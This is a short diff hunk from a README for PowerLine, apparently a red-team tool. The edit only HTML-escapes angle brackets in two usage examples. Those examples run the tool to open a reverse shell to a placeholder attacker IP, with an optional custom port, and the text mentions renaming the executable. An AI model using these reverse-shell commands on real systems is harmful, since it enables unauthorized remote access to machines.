@@ -125,11 +125,11 @@ I would like to encourage you to build your own PowerLine.exe (rename it to what
 
 You can run it like this, from a CMD prompt:
 
-PowerLine.exe reveshell "revshell -hostip <attackrs IP>"
+PowerLine.exe reveshell "revshell -hostip &lt;attackrs IP&gt;"
 
 Or if you are listening on a different port than 5379:
 
-PowerLine.exe revshell "revshell -hostip <attackers IP> -port <desired port>"
+PowerLine.exe revshell "revshell -hostip &lt;attackers IP&gt; -port &lt;desired port&gt;"
 
 **PowerLine.vbs**
 
